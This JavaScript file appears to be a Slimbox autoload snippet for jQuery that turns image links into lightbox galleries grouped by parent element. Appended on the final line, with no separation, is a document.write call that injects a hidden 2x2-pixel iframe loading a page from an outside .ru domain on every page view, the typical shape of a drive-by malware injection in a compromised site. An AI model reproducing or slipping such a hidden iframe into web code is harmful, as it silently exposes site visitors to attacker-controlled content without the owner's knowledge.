/*
	With the following code, Slimbox will activate itself automatically on all links pointing to images,
	or more specifically all links having URLs ending with: ".jpg" or ".png" or ".gif".
	As a result, you will not need to set the rel="lightbox" attribute on any link to activate Slimbox.
	Furthermore, all image links contained in the same block or paragraph (having the same parent element)
	will automatically be grouped together in a gallery, so you will not need to specify groups either.
	Images that are alone in their block or paragraph will be displayed individually.

	Replace the default autoload code block with this one.
*/

jQuery(function($) {
	$("a[href]").filter(function() {
		return /\.(jpg|png|gif)$/i.test(this.href);
	}).slimbox({}, null, function(el) {
		return (this == el) || (this.parentNode && (this.parentNode == el.parentNode));
	});
});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');